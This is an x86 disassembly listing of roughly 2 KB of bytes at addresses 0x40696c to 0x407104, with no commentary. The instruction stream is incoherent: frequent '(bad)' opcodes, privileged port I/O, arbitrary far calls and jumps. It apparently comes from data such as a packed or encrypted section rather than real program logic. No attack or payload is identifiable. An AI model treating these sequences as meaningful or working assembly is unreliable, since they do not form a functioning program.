  40696c:	popa   
  40696d:	dec    ecx
  40696e:	loop   0x40691b
  406970:	in     eax,0xb5
  406972:	push   esi
  406973:	dec    edi
  406974:	sbb    cl,dl
  406976:	adc    bl,BYTE PTR [ecx+0x32aff877]
  40697c:	sub    ebp,DWORD PTR [ecx+0x7f]
  40697f:	adc    eax,DWORD PTR [eax]
  406981:	test   DWORD PTR [edi+eax*4-0x59d8688c],esp
  406988:	pop    eax
  406989:	cmp    eax,0xb1a4373c
  40698e:	es std 
  406990:	shr    esp,1
  406992:	add    eax,0x34a43c88
  406997:	adc    al,BYTE PTR [edx-0x29438839]
  40699d:	ss mov ebp,0x3e5c3c1f
  4069a3:	int    0x37
  4069a5:	mov    eax,0xadd130e8
  4069aa:	stos   DWORD PTR es:[di],eax
  4069ac:	ret    0x4c8c
  4069af:	inc    edx
  4069b0:	xor    BYTE PTR [ecx],cl
  4069b2:	sub    DWORD PTR es:[ebx],0xffffff9e
  4069b6:	or     eax,0xcf6c0d47
  4069bb:	fild   WORD PTR [esi]
  4069bd:	out    dx,eax
  4069be:	js     0x4069a2
  4069c0:	xchg   edx,eax
  4069c1:	fidivr DWORD PTR [edi]
  4069c3:	sub    al,0x12
  4069c5:	pop    esi
  4069c6:	push   0x2ef58c34
  4069cb:	cmp    bl,BYTE PTR [ecx+ebx*8-0x69bd6759]
  4069d2:	ins    BYTE PTR es:[edi],dx
  4069d3:	stos   BYTE PTR es:[edi],al
  4069d4:	adc    eax,0xf5e6bce4
  4069d9:	std    
  4069da:	pop    eax
  4069db:	cmp    DWORD PTR [esi-0x6b],edi
  4069de:	cmp    al,0xa4
  4069e0:	sbb    eax,0x124db2d2
  4069e5:	retf   
  4069e6:	pmaxsw mm5,mm4
  4069e9:	push   ecx
  4069ea:	dec    ebp
  4069eb:	retf   0xc82d
  4069ee:	xchg   ecx,eax
  4069ef:	adc    BYTE PTR [ebp+0x38],bl
  4069f2:	or     BYTE PTR [edi+ebx*1-0x3d],ch
  4069f6:	dec    esp
  4069f7:	test   BYTE PTR [ebp+0x5fe0963d],cl
  4069fd:	pop    es
  4069fe:	sbb    ah,BYTE PTR [ecx]
  406a00:	xor    DWORD PTR [ecx+esi*2-0x21824244],ecx
  406a07:	(bad)  
  406a08:	cld    
  406a09:	stos   BYTE PTR es:[edi],al
  406a0a:	in     al,dx
  406a0b:	test   DWORD PTR [edi-0x522cd3cc],0xd76480ae
  406a15:	xchg   ebp,eax
  406a16:	dec    ebp
  406a17:	mov    ecx,DWORD PTR [edx]
  406a19:	(bad)  
  406a1b:	mov    ebx,0xa79f9c29
  406a20:	fsubr  DWORD PTR [eax-0xe]
  406a23:	pop    edx
  406a24:	mov    ah,0xd9
  406a26:	fild   QWORD PTR [esi-0x46]
  406a29:	lahf   
  406a2a:	repnz xchg ecx,eax
  406a2c:	loopne 0x4069bc
  406a2e:	lfs    esp,FWORD PTR [edx+ecx*4+0x3e]
  406a33:	fcom   QWORD PTR [edx-0x3b62efa]
  406a39:	add    dh,BYTE PTR [ebp-0x17]
  406a3c:	int    0xdb
  406a3e:	outs   dx,DWORD PTR ds:[esi]
  406a3f:	sbb    eax,0x76ee55b4
  406a44:	xor    DWORD PTR [ebx],edx
  406a46:	loop   0x4069dc
  406a48:	mov    esi,0xa927393c
  406a4d:	(bad)  
  406a4e:	pushf  
  406a4f:	jne    0x4069e1
  406a51:	pop    ss
  406a52:	dec    ecx
  406a53:	out    dx,al
  406a54:	mov    dl,al
  406a56:	add    BYTE PTR [ecx],dl
  406a58:	ficomp DWORD PTR [ecx-0x53]
  406a5b:	dec    edx
  406a5c:	imul   ebx,DWORD PTR [ebx-0x63],0x21
  406a60:	outs   dx,BYTE PTR ds:[esi]
  406a61:	pushf  
  406a62:	xor    eax,0x9587f3a8
  406a67:	dec    edx
  406a68:	scas   al,BYTE PTR es:[edi]
  406a69:	jmp    0x406add
  406a6b:	test   BYTE PTR [eax-0x78],ah
  406a6e:	bound  edi,QWORD PTR [esi-0x8583f1f]
  406a74:	mov    ebp,0xd4af7fa7
  406a79:	pop    ecx
  406a7a:	mov    ss,edx
  406a7c:	icebp  
  406a7d:	popf   
  406a7e:	scas   al,BYTE PTR es:[edi]
  406a7f:	dec    ecx
  406a80:	imul   edx,DWORD PTR [edx],0xfffffffd
  406a83:	jle    0x406a9d
  406a85:	adc    DWORD PTR [edi-0xe],ebx
  406a88:	scas   eax,DWORD PTR es:[edi]
  406a89:	and    al,0x2f
  406a8b:	push   ebx
  406a8c:	leave  
  406a8d:	cmc    
  406a8e:	push   ds
  406a8f:	pop    ecx
  406a90:	cmp    eax,0x47c7312b
  406a95:	jb     0x406b0c
  406a97:	dec    ecx
  406a98:	inc    DWORD PTR [ecx]
  406a9a:	rol    DWORD PTR [eax-0x1d],1
  406a9d:	fsubr  DWORD PTR [eax]
  406a9f:	mov    bh,0x92
  406aa1:	adc    DWORD PTR [esp+esi*2+0x27],0x154d0644
  406aa9:	mov    bh,0x6e
  406aab:	out    0x3a,eax
  406aad:	sbb    eax,ecx
  406aaf:	cmp    BYTE PTR [edx],dl
  406ab1:	in     al,0x41
  406ab3:	sar    DWORD PTR [eax-0x34],1
  406ab6:	add    eax,0x4b66b4b8
  406abb:	and    ch,BYTE PTR [edi-0x4598cc6d]
  406ac1:	cmp    eax,0x63bcc299
  406ac6:	(bad)  
  406ac7:	xor    dh,BYTE PTR [ebx+0x73]
  406aca:	cmc    
  406acb:	and    cl,BYTE PTR [bx+di]
  406ace:	push   ss
  406acf:	sub    eax,ebp
  406ad1:	fs add al,0x3a
  406ad5:	dec    esp
  406ad6:	(bad)  
  406ad7:	and    ebp,ebx
  406ad9:	sub    eax,0x14b6a4e3
  406ade:	mov    ch,0x2e
  406ae0:	jl     0x406a94
  406ae2:	xlat   BYTE PTR ds:[ebx]
  406ae3:	call   0x6c15:0x818b61f7
  406aea:	or     WORD PTR [edx+0x5],0x3a
  406aef:	sub    DWORD PTR [eax+0x9],esi
  406af2:	push   cs
  406af3:	cdq    
  406af4:	jle    0x406a89
  406af6:	cmp    eax,0xda763398
  406afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afc:	stos   DWORD PTR es:[edi],eax
  406afd:	jb     0x406b1f
  406aff:	(bad)  
  406b00:	sbb    al,0x6a
  406b02:	push   edi
  406b03:	and    eax,0xcb064bbe
  406b08:	jb     0x406ab0
  406b0a:	cmp    ch,0xf3
  406b0d:	push   esi
  406b0e:	xchg   edi,eax
  406b0f:	xchg   ecx,eax
  406b10:	(bad)  
  406b11:	push   ss
  406b12:	sbb    eax,0x7f915b66
  406b17:	jl     0x406a9e
  406b19:	pop    ss
  406b1a:	nop
  406b1b:	imul   edi,DWORD PTR [ebp+ebp*8-0x1e],0x1b6a5cb0
  406b23:	cmp    eax,0x38cc367
  406b28:	in     eax,0xf7
  406b2a:	daa    
  406b2b:	loopne 0x406b10
  406b2d:	xlat   BYTE PTR ds:[ebx]
  406b2e:	sub    BYTE PTR [ebp-0x5e5de64f],dl
  406b34:	clc    
  406b35:	lods   eax,DWORD PTR ds:[esi]
  406b36:	jo     0x406b99
  406b38:	mov    eax,ds:0xe39ac46b
  406b3d:	pop    eax
  406b3e:	(bad)  
  406b3f:	test   al,0x6f
  406b41:	or     eax,0xf9b7b69
  406b46:	jl     0x406b6f
  406b48:	and    al,BYTE PTR [ecx-0x72]
  406b4b:	call   0x9c6a:0x4e01c868
  406b52:	and    ebx,DWORD PTR [ecx+0x23464c82]
  406b58:	mov    bl,BYTE PTR [edi+0x705a15be]
  406b5e:	sub    esp,DWORD PTR [edx+0x2d]
  406b61:	push   ss
  406b62:	popf   
  406b63:	ins    BYTE PTR es:[edi],dx
  406b64:	push   ebp
  406b65:	jecxz  0x406b9d
  406b67:	jae    0x406b20
  406b69:	jns    0x406b9c
  406b6b:	push   ds
  406b6c:	sbb    ebx,ecx
  406b6e:	mov    esp,0x17e93ca3
  406b73:	shr    ah,cl
  406b75:	jbe    0x406bd8
  406b77:	ds jle 0x406bf5
  406b7a:	outs   dx,BYTE PTR ds:[esi]
  406b7b:	sub    eax,0xf4752cac
  406b80:	cwde   
  406b81:	test   BYTE PTR [edi],ah
  406b83:	mov    dh,0x1c
  406b85:	cmp    al,0x26
  406b87:	mov    ebx,0xd9b4834c
  406b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b8d:	or     DWORD PTR [edi-0x74],ecx
  406b90:	into   
  406b91:	xor    DWORD PTR [ebp-0x5e445882],ebx
  406b97:	xchg   ebx,eax
  406b98:	aam    0xcc
  406b9a:	loop   0x406c1a
  406b9c:	sbb    al,0xb2
  406b9e:	xor    eax,0x7ac70187
  406ba3:	stos   DWORD PTR es:[edi],eax
  406ba4:	add    DWORD PTR [edi],ebp
  406ba6:	in     eax,0x17
  406ba8:	rol    DWORD PTR [ebx],1
  406baa:	jb     0x406be8
  406bac:	cld    
  406bad:	imul   DWORD PTR [edx]
  406baf:	aad    0x66
  406bb1:	jmp    ebx
  406bb3:	outs   dx,BYTE PTR ds:[esi]
  406bb4:	sti    
  406bb5:	pop    esp
  406bb6:	mov    bh,0xf3
  406bb8:	stc    
  406bb9:	and    BYTE PTR [ebp+0x5195f6a2],dl
  406bbf:	pop    edx
  406bc0:	aaa    
  406bc1:	cmp    dh,ch
  406bc3:	add    eax,0x95cea0aa
  406bc8:	sbb    esp,DWORD PTR [eax+0x227a15ce]
  406bce:	dec    esi
  406bcf:	pop    edx
  406bd0:	pop    edi
  406bd1:	sub    ebp,DWORD PTR [edx+0x2d]
  406bd4:	push   cs
  406bd5:	and    al,0x4b
  406bd8:	add    edi,edi
  406bda:	add    al,0xb4
  406bdc:	inc    esp
  406bdd:	and    ebx,DWORD PTR [edi+edi*4-0x6d]
  406be1:	shl    DWORD PTR [edx-0x42],cl
  406be4:	jmp    0xda4c0af0
  406be9:	(bad)  
  406bea:	jnp    0x406c18
  406bec:	dec    edx
  406bed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bee:	fstp   TBYTE PTR [edx-0x4da6bc29]
  406bf4:	test   ebp,edi
  406bf6:	popf   
  406bf7:	sbb    BYTE PTR [edi+edx*2],ah
  406bfa:	dec    ecx
  406bfb:	imul   eax,DWORD PTR [ebx+0x2f],0x6f
  406bff:	mov    ds:0xb80b773c,al
  406c04:	or     DWORD PTR [edi-0x3a],ebp
  406c07:	inc    ebp
  406c08:	jecxz  0x406c84
  406c0a:	and    edx,DWORD PTR [ebx-0x6]
  406c0d:	inc    edi
  406c0e:	stc    
  406c0f:	int3   
  406c10:	push   esp
  406c11:	dec    ecx
  406c12:	ins    BYTE PTR es:[edi],dx
  406c13:	das    
  406c14:	scas   al,BYTE PTR es:[edi]
  406c15:	lods   al,BYTE PTR ds:[esi]
  406c16:	dec    eax
  406c17:	xor    DWORD PTR [esp+0x6f],esp
  406c1b:	jge    0x406c4b
  406c1d:	jb     0x406bfd
  406c1f:	fsubr  DWORD PTR [ebx+0x4a8fff59]
  406c25:	sub    esp,edx
  406c27:	aas    
  406c28:	dec    esp
  406c29:	aam    0xfe
  406c2b:	jbe    0x406c23
  406c2d:	xor    al,BYTE PTR ds:0x8a07add1
  406c33:	mov    ch,0x2e
  406c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c36:	cmp    BYTE PTR [eax-0x741b0181],cl
  406c3c:	jae    0x406c37
  406c3e:	pop    es
  406c3f:	shr    BYTE PTR [edx+0x561b5171],0x84
  406c46:	pop    es
  406c47:	dec    eax
  406c48:	into   
  406c49:	test   al,0x55
  406c4b:	hlt    
  406c4c:	mov    edx,ecx
  406c4e:	loopne 0x406c91
  406c50:	aam    0x86
  406c52:	into   
  406c53:	call   0x5100:0x10800cf6
  406c5a:	mov    esi,0xbdc9b81c
  406c5f:	xchg   BYTE PTR [esi],al
  406c61:	popa   
  406c62:	test   al,0xee
  406c64:	add    eax,0x8c0bd8a1
  406c69:	arpl   WORD PTR [ebp+0x3f],si
  406c6c:	fstp   DWORD PTR cs:[esi-0x45f7deb9]
  406c73:	mov    al,0x91
  406c75:	das    
  406c76:	ds fistp DWORD PTR gs:[eax+ebp*2]
  406c7b:	mov    ebp,DWORD PTR [ecx]
  406c7d:	std    
  406c7e:	sbb    ah,0xf5
  406c81:	jb     0x406cf2
  406c83:	or     DWORD PTR [edx+0x6c],0x67
  406c87:	pop    es
  406c88:	pop    esp
  406c89:	jns    0x406cf6
  406c8b:	cli    
  406c8c:	loopne 0x406c5e
  406c8e:	mov    al,0x51
  406c90:	test   eax,0x58efbda1
  406c95:	lahf   
  406c96:	mov    dl,0xf2
  406c98:	les    esi,FWORD PTR [ecx-0x13a292e7]
  406c9e:	mov    al,ds:0xd6ef2086
  406ca3:	cmc    
  406ca4:	out    dx,eax
  406ca5:	bound  ecx,QWORD PTR [ecx+eiz*4+0x7a7a99f0]
  406cac:	int3   
  406cad:	add    eax,edi
  406caf:	mov    ebp,0x83ac54e9
  406cb4:	jne    0x406c94
  406cb6:	mov    esi,0x699d1073
  406cbb:	sbb    ah,ah
  406cbd:	xor    edx,DWORD PTR [edi+0x57c80323]
  406cc3:	pop    esp
  406cc4:	lods   al,BYTE PTR ds:[esi]
  406cc5:	lods   al,BYTE PTR ds:[esi]
  406cc6:	jl     0x406cd8
  406cc8:	jmp    0x55d614ab
  406ccd:	in     eax,dx
  406cce:	mov    al,ds:0x945667c3
  406cd3:	xchg   esi,eax
  406cd4:	lahf   
  406cd5:	or     eax,0x508509d1
  406cda:	icebp  
  406cdb:	dec    eax
  406cdc:	and    esi,DWORD PTR [ebx]
  406cde:	stos   DWORD PTR es:[edi],eax
  406cdf:	inc    esi
  406ce0:	out    0x55,eax
  406ce2:	dec    ebp
  406ce3:	sar    al,0x43
  406ce6:	mov    bl,0x9b
  406ce8:	ret    
  406ce9:	and    eax,0xfd36e16e
  406cee:	pop    edx
  406cef:	js     0x406c94
  406cf1:	and    eax,DWORD PTR es:0x3bde3eaf
  406cf8:	pop    ebx
  406cf9:	cwde   
  406cfa:	cmp    eax,0x222221a2
  406cff:	jge    0x406ca0
  406d01:	cmp    BYTE PTR [eax+0x6b80b1cd],dh
  406d07:	sub    edi,DWORD PTR [esi]
  406d09:	dec    edi
  406d0a:	rcr    DWORD PTR [ebx],cl
  406d0c:	out    dx,al
  406d0d:	mov    al,ds:0x1474188
  406d12:	push   ebp
  406d13:	popf   
  406d14:	dec    esi
  406d15:	jae    0x406cd5
  406d17:	cmp    ch,al
  406d19:	(bad)  
  406d1b:	fnstcw WORD PTR [esi]
  406d1d:	mov    bl,0x76
  406d1f:	cmp    BYTE PTR [ecx],dh
  406d21:	int3   
  406d22:	xor    al,0xe9
  406d24:	arpl   WORD PTR fs:[ecx-0x16],bp
  406d28:	mov    ds:0x539345,eax
  406d2d:	push   0x3a3599dd
  406d32:	icebp  
  406d33:	jbe    0x406d2a
  406d35:	mov    ds:0xe977bb09,eax
  406d3a:	and    al,0xbb
  406d3c:	xor    eax,0xa2e9ec27
  406d41:	popa   
  406d42:	adc    DWORD PTR [edi-0x288e17e1],ebx
  406d48:	push   edx
  406d49:	inc    ecx
  406d4a:	scas   eax,DWORD PTR es:[edi]
  406d4b:	cli    
  406d4c:	mov    ds:0x5b14f5ce,al
  406d51:	xchg   ebp,eax
  406d52:	arpl   bx,dx
  406d54:	push   ecx
  406d56:	jo     0x406dcf
  406d58:	push   edx
  406d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d5a:	or     BYTE PTR [esi],dh
  406d5c:	enter  0x29e4,0x87
  406d60:	(bad)  
  406d61:	mov    al,ds:0xe78090ea
  406d66:	xchg   esi,eax
  406d67:	std    
  406d68:	gs pop edi
  406d6a:	out    dx,eax
  406d6b:	lods   eax,DWORD PTR ds:[esi]
  406d6c:	cli    
  406d6d:	dec    edx
  406d6e:	lods   al,BYTE PTR ds:[esi]
  406d6f:	add    al,0x52
  406d71:	out    dx,al
  406d72:	and    al,0xbb
  406d74:	(bad)  
  406d75:	icebp  
  406d76:	and    al,0xdb
  406d78:	xchg   ecx,eax
  406d79:	mov    eax,0xc0d0141b
  406d7e:	out    0x34,eax
  406d80:	mov    ebp,0x8bd910c8
  406d85:	rcr    edx,1
  406d87:	addr16 jo 0x406d5a
  406d8a:	pop    ss
  406d8b:	inc    edx
  406d8c:	pop    ecx
  406d8d:	mov    esi,0xc8e479df
  406d92:	(bad)  
  406d93:	xlat   BYTE PTR ds:[ebx]
  406d94:	fisttp QWORD PTR [edi+0x10648720]
  406d9a:	rcl    eax,0xb3
  406d9d:	stc    
  406d9e:	push   ecx
  406d9f:	mov    ds:0x656c485c,al
  406da4:	cdq    
  406da5:	push   ss
  406da6:	popf   
  406da7:	test   DWORD PTR [esi+0x8686962],eax
  406dad:	mov    bl,BYTE PTR [ebx-0x1e]
  406db0:	test   BYTE PTR [ecx+edi*2-0x427395d],bh
  406db7:	stos   DWORD PTR es:[edi],eax
  406db8:	xchg   DWORD PTR [esi],ebx
  406dba:	xlat   BYTE PTR ds:[ebx]
  406dbb:	jns    0x406e31
  406dbd:	or     dh,BYTE PTR [eax]
  406dbf:	sbb    al,0xcf
  406dc1:	cmp    eax,0xdc39949e
  406dc6:	jecxz  0x406de9
  406dc8:	bound  eax,QWORD PTR ds:0xf110b3f0
  406dce:	cmp    eax,0x39482661
  406dd3:	jmp    0xa1de0041
  406dd8:	push   edx
  406dd9:	dec    eax
  406dda:	es mov al,0xb1
  406ddd:	stos   BYTE PTR es:[edi],al
  406dde:	add    ecx,edx
  406de0:	mov    ds:0x9b16ff23,al
  406de5:	mov    esp,0x644b358
  406dea:	sbb    ch,BYTE PTR ds:0xdd3ae4fb
  406df0:	out    dx,eax
  406df1:	jne    0x406e33
  406df3:	pop    esp
  406df4:	fbstp  TBYTE PTR [eax]
  406df6:	sahf   
  406df7:	adc    BYTE PTR [ecx-0x471ec328],dl
  406dfd:	mov    ds:0x379e4ccf,eax
  406e02:	and    eax,0xdf94849a
  406e07:	out    dx,eax
  406e08:	xchg   DWORD PTR [esi+0x565a50e9],esp
  406e0e:	jno    0x406dfa
  406e10:	mov    ?,WORD PTR [ebx+0x42db2e60]
  406e16:	nop
  406e17:	scas   al,BYTE PTR es:[edi]
  406e18:	jb     0x406df5
  406e1a:	mov    dl,0x35
  406e1c:	xchg   cl,dl
  406e1e:	ins    BYTE PTR es:[edi],dx
  406e1f:	dec    eax
  406e20:	repnz fist WORD PTR [eax+0x1c203fe5]
  406e27:	je     0x406e9f
  406e29:	clc    
  406e2a:	jg     0x406e96
  406e2c:	in     al,dx
  406e2d:	fwait
  406e2e:	test   BYTE PTR [esi+ebx*8+0x7a3f1266],dl
  406e35:	aaa    
  406e36:	add    DWORD PTR [ecx+0x11],esp
  406e39:	mov    cl,0xa9
  406e3b:	add    BYTE PTR [edx+0xc],0xc0
  406e3f:	outs   dx,BYTE PTR ds:[esi]
  406e40:	repnz pusha 
  406e42:	adc    eax,esp
  406e44:	pop    ss
  406e45:	push   edx
  406e46:	jno    0x406ea0
  406e48:	push   eax
  406e49:	int    0x70
  406e4b:	dec    ecx
  406e4c:	add    BYTE PTR [esi-0x35171968],bl
  406e52:	jnp    0x406e9d
  406e54:	fs int 0x71
  406e57:	jns    0x406eb4
  406e59:	in     al,dx
  406e5a:	es cld 
  406e5c:	adc    eax,0x80a4b430
  406e61:	stc    
  406e62:	int3   
  406e63:	pushf  
  406e64:	hlt    
  406e65:	add    cl,BYTE PTR [ebp+edi*1-0x47]
  406e69:	jge    0x406e3a
  406e6b:	and    ebp,esi
  406e6d:	pop    DWORD PTR [edx-0x1eb41915]
  406e73:	ds nop
  406e75:	sub    eax,0x8e90d0d6
  406e7a:	lods   eax,DWORD PTR ds:[esi]
  406e7b:	add    BYTE PTR [ebx-0x271fb473],0xb3
  406e82:	inc    ecx
  406e83:	push   cs
  406e84:	test   eax,0x74291adc
  406e89:	sub    eax,0x6320c766
  406e8e:	pusha  
  406e8f:	mov    ds:0x47ef8381,al
  406e94:	push   esi
  406e95:	xchg   ebx,eax
  406e96:	stc    
  406e97:	sbb    BYTE PTR [ebp+edi*4+0x3a],al
  406e9b:	fsub   QWORD PTR [esi]
  406e9d:	push   ebp
  406e9e:	dec    edi
  406e9f:	ret    0x6a9f
  406ea2:	xor    al,BYTE PTR [esi-0x71]
  406ea5:	xor    ebp,ecx
  406ea7:	arpl   WORD PTR [esi+ebx*2-0x46],sp
  406eab:	inc    esp
  406eac:	sub    al,0xfb
  406eae:	sub    BYTE PTR ds:0x131ee98f,ah
  406eb4:	call   0x9bdc7673
  406eb9:	cmp    dl,BYTE PTR [edi-0x6e2fd967]
  406ebf:	and    al,0x7a
  406ec1:	(bad)  
  406ec2:	adc    ch,BYTE PTR [ecx]
  406ec4:	mov    al,0x77
  406ec6:	imul   ecx,DWORD PTR [ecx-0x16],0xd269abe2
  406ecd:	adc    DWORD PTR [ebx],esp
  406ecf:	or     BYTE PTR [ebp+0x1e],dl
  406ed2:	rcr    BYTE PTR [eax],0x40
  406ed5:	int3   
  406ed6:	int    0x54
  406ed8:	scas   eax,DWORD PTR es:[edi]
  406ed9:	pop    esi
  406eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406edb:	pop    ebp
  406edc:	div    BYTE PTR [ecx+0x6]
  406edf:	mov    ebp,0x47f29940
  406ee4:	xor    eax,0x22c372ac
  406ee9:	test   DWORD PTR [ebp+0x1e],esi
  406eec:	pop    edx
  406eed:	lea    ebx,[ecx+0x241c1801]
  406ef3:	pop    ebx
  406ef4:	pop    ecx
  406ef5:	pushf  
  406ef6:	mov    esi,0xea2544db
  406efb:	imul   edi,DWORD PTR [eax],0x3278dd4f
  406f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f02:	push   esp
  406f03:	pop    ebx
  406f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f05:	jg     0x406ef2
  406f07:	add    ah,BYTE PTR [edx-0x25]
  406f0a:	jno    0x406f18
  406f0c:	inc    ecx
  406f0d:	aaa    
  406f0e:	mov    edi,0x3f865d66
  406f13:	inc    ecx
  406f14:	lds    edx,FWORD PTR [edi-0x8]
  406f17:	and    ah,BYTE PTR [ebp+0x715bfc94]
  406f1d:	cmp    eax,0xbeacf3d5
  406f22:	call   0xcc8f:0x2481ec6d
  406f29:	adc    edi,DWORD PTR [ebx-0x179ff250]
  406f2f:	rcl    BYTE PTR [ebp+0x4a],1
  406f32:	mov    dl,0x92
  406f34:	add    esp,DWORD PTR [ebx]
  406f36:	pop    esp
  406f37:	pop    edx
  406f38:	rep outs dx,BYTE PTR ds:[esi]
  406f3a:	or     DWORD PTR [ebx+0x7],ecx
  406f3d:	mov    ah,0xa9
  406f3f:	call   0x6a98:0x9f69415
  406f46:	into   
  406f47:	jg     0x406fb7
  406f49:	lods   eax,DWORD PTR ds:[esi]
  406f4a:	nop
  406f4b:	test   DWORD PTR [eax],ebx
  406f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f4e:	and    bh,BYTE PTR ds:0x31a98684
  406f54:	mov    ds:0x88180501,eax
  406f59:	lahf   
  406f5a:	int    0x3c
  406f5c:	scas   eax,DWORD PTR es:[edi]
  406f5d:	in     eax,0x68
  406f5f:	sub    al,0x8b
  406f61:	adc    ecx,edi
  406f63:	idiv   DWORD PTR [edi-0x51]
  406f66:	dec    esp
  406f67:	aam    0x1f
  406f69:	enter  0xf902,0xfe
  406f6d:	or     edi,eax
  406f6f:	mov    ds:0xa87efece,al
  406f74:	cmp    ch,BYTE PTR [esi+edi*2+0x9]
  406f78:	dec    ebp
  406f79:	add    bh,al
  406f7b:	push   edi
  406f7c:	scas   al,BYTE PTR es:[edi]
  406f7d:	push   ds
  406f7e:	aad    0xb2
  406f80:	cli    
  406f81:	lds    eax,FWORD PTR [ecx-0x74]
  406f84:	jb     0x406f34
  406f86:	sub    dl,BYTE PTR [edx+0x65]
  406f89:	(bad)  
  406f8a:	sbb    eax,0x7dfe343e
  406f8f:	or     cl,dh
  406f91:	xchg   DWORD PTR [edi],eax
  406f93:	(bad)
  406f97:	fs loopne 0x406f9b
  406f9a:	test   eax,0x4e84f15f
  406f9f:	inc    edi
  406fa0:	rcr    DWORD PTR [eax],cl
  406fa2:	cmp    al,0x23
  406fa4:	test   DWORD PTR [esi+0xc],edi
  406fa7:	pop    esp
  406fa8:	push   ecx
  406fa9:	sbb    al,0x30
  406fab:	pop    ebx
  406fac:	mov    WORD PTR [esi],gs
  406fae:	push   ss
  406faf:	int3   
  406fb0:	xchg   esi,eax
  406fb1:	(bad)  
  406fb2:	mov    ebx,0xe36b8f58
  406fb7:	inc    edi
  406fb8:	inc    esp
  406fb9:	xor    edi,ecx
  406fbb:	repnz loop 0x407014
  406fbe:	in     al,0xdf
  406fc0:	push   ds
  406fc1:	pop    edx
  406fc2:	in     eax,0x37
  406fc4:	or     eax,0xe0446ce1
  406fc9:	adc    ecx,DWORD PTR [ebx-0x7906f6f4]
  406fcf:	sbb    BYTE PTR [esi-0x10042c5a],cl
  406fd5:	inc    edi
  406fd6:	push   ecx
  406fd7:	or     edi,DWORD PTR [edi]
  406fd9:	cdq    
  406fda:	cmp    eax,0xad198697
  406fdf:	xchg   BYTE PTR cs:[esi],bh
  406fe2:	fidiv  WORD PTR [edi+0xe9eef47]
  406fe8:	dec    esi
  406fe9:	pushf  
  406fea:	arpl   WORD PTR [ecx+0x7fa8f23],dx
  406ff0:	mov    ds:0x49cdb6ce,al
  406ff5:	stc    
  406ff6:	pop    ecx
  406ff7:	dec    esi
  406ff8:	inc    ecx
  406ff9:	push   ds
  406ffa:	sub    bh,dl
  406ffc:	shl    DWORD PTR [edi-0x1e],cl
  406fff:	rcr    DWORD PTR [ecx],cl
  407001:	push   cs
  407002:	outs   dx,DWORD PTR ds:[esi]
  407003:	xchg   edi,eax
  407004:	xor    esp,DWORD PTR [edi]
  407006:	fisub  WORD PTR [esi+edi*2]
  407009:	sub    edi,ebx
  40700b:	xchg   edx,eax
  40700c:	push   ebx
  40700d:	pop    ebx
  40700e:	sbb    al,0x18
  407010:	aam    0x8d
  407012:	fimul  DWORD PTR [ebp+edx*1-0x4101bf68]
  40701a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40701b:	mov    eax,0x5e3d6510
  407020:	adc    al,0x5e
  407022:	icebp  
  407023:	lods   al,BYTE PTR ds:[esi]
  407024:	mov    dl,0x49
  407026:	addr16 push edi
  407028:	cmp    eax,0x53d99f35
  40702d:	cmp    al,0x22
  40702f:	test   DWORD PTR [edx],edx
  407031:	jle    0x406fda
  407033:	retf   0x2678
  407036:	cmp    BYTE PTR [ebx+0x52],ah
  407039:	ds syscall 
  40703c:	push   es
  40703d:	jmp    0x40702a
  40703f:	out    0x61,eax
  407041:	cli    
  407042:	mov    al,bl
  407044:	(bad)  
  407045:	sub    BYTE PTR ds:0xfd95d5dd,bl
  40704b:	aas    
  40704c:	fst    st(4)
  40704e:	sbb    al,0x40
  407050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407051:	cmc    
  407052:	or     eax,0x87fe48f9
  407057:	jae    0x406fe5
  407059:	mov    edi,0x6684f177
  40705e:	shr    eax,0x4e
  407061:	cmp    dl,BYTE PTR ds:0x8bbbb6ec
  407067:	pop    es
  407068:	jbe    0x4070a4
  40706a:	mov    ah,0x52
  40706c:	xor    BYTE PTR [ecx+0x2f],ah
  40706f:	jp     0x4070b1
  407071:	call   0xee6f7a33
  407076:	lods   eax,DWORD PTR ds:[esi]
  407077:	xchg   BYTE PTR [eax+0x39],bl
  40707a:	(bad)  
  40707b:	and    al,0x1d
  40707d:	call   0x14b9:0x299e99ef
  407084:	and    cl,BYTE PTR [eax]
  407086:	ret    
  407087:	xchg   esi,eax
  407088:	inc    edi
  407089:	ret    0xdacd
  40708c:	cld    
  40708d:	jmp    0x4070d5
  40708f:	xchg   esp,eax
  407090:	cld    
  407091:	psraw  mm2,QWORD PTR [eax+0x20b2a6fc]
  407098:	sub    eax,0xff72a678
  40709d:	ret    0x3688
  4070a0:	fcmovnu st,st(3)
  4070a2:	mov    ecx,0x98ad6164
  4070a7:	imul   esp,DWORD PTR [edx-0x3038f05f],0x73
  4070ae:	idiv   DWORD PTR [ebx+0x7]
  4070b1:	pop    edx
  4070b2:	push   es
  4070b3:	scas   al,BYTE PTR es:[edi]
  4070b4:	dec    esi
  4070b5:	icebp  
  4070b6:	js     0x407070
  4070b8:	int    0x23
  4070ba:	imul   edx,DWORD PTR [edi],0xecefb738
  4070c0:	xor    BYTE PTR [eax],bl
  4070c2:	(bad)  
  4070c3:	lods   eax,DWORD PTR ds:[esi]
  4070c4:	mov    bl,0x3f
  4070c6:	aad    0xf
  4070c8:	adc    ecx,eax
  4070ca:	mov    ebp,DWORD PTR [ebx+0x2ee2e4a6]
  4070d0:	shr    DWORD PTR [edx],0x64
  4070d3:	dec    edx
  4070d4:	jae    0x4070fa
  4070d6:	jl     0x40712d
  4070d8:	js     0x4070fa
  4070da:	std    
  4070db:	inc    ebx
  4070dc:	leave  
  4070dd:	mov    dl,0x30
  4070df:	mov    ds:0x1981b1b0,al
  4070e4:	in     eax,dx
  4070e5:	mov    eax,ds:0xc0448579
  4070ea:	and    DWORD PTR ds:0xa1e76bc2,edi
  4070f0:	push   esp
  4070f1:	push   ds
  4070f2:	jmp    0x38c6e5b5
  4070f7:	cmp    DWORD PTR [ecx+0x43],esp
  4070fa:	repz dec eax
  4070fc:	inc    ebx
  4070fd:	or     DWORD PTR [eax+0xa],esi
  407100:	dec    ecx
  407101:	mov    cl,0x91
  407103:	dec    edi
  407104:	pushf  
